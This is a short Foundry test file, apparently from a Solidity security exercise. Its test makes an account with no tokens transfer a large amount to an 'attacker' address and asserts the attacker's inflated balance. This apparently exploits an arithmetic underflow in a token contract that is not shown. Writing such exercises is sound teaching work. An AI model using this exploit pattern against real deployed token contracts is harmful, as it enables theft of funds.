// SPDX-License-Identifier: MIT
pragma abicoder v2;
pragma solidity ^0.7.0;

import {Test, console} from "forge-std/Test.sol";
import {SimpleToken} from "../../src/ao-2/SimpleToken.sol";

contract SimpleTokenkTest is Test {

    address deployer = makeAddr("deployer");
    address attacker = makeAddr("you");
    address other = makeAddr("other");

    SimpleToken simpleToken;

    uint256 constant DEPLOYER_INIT_TOKENS = 100000;
    uint256 constant YOU_INIT_TOKENS = 10;

    function setUp() public {
        vm.startPrank(deployer);
        simpleToken = new SimpleToken();
        simpleToken.mint(deployer, DEPLOYER_INIT_TOKENS);
        simpleToken.mint(attacker, YOU_INIT_TOKENS);

        // victim deposits funds
        // hoax(victim, VICTIM_INITIAL_BALANCE);
        // timelock.depositETH{value: VICTIM_DEPOSIT}();
    }

    function testAttack() public {
        vm.startPrank(other);
        console.log(simpleToken.getBalance(other), simpleToken.getBalance(attacker));
        simpleToken.transfer(attacker, 1000000);
        console.log(simpleToken.getBalance(other), simpleToken.getBalance(attacker));
        
        vm.stopPrank();
        assertTrue(simpleToken.getBalance(attacker) > 1000000);
    }

}